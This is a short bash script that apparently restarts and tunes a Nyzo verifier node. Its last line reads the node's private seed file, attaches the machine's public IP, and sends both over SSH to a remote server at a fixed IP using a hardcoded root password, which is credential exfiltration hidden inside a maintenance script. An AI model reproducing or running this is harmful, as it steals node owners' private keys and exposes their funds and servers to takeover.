#!/bin/bash
sudo su
sudo supervisorctl reload
sleep 3s
sudo renice -n -5 -p $(pgrep ^java$)
echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/verifiers'

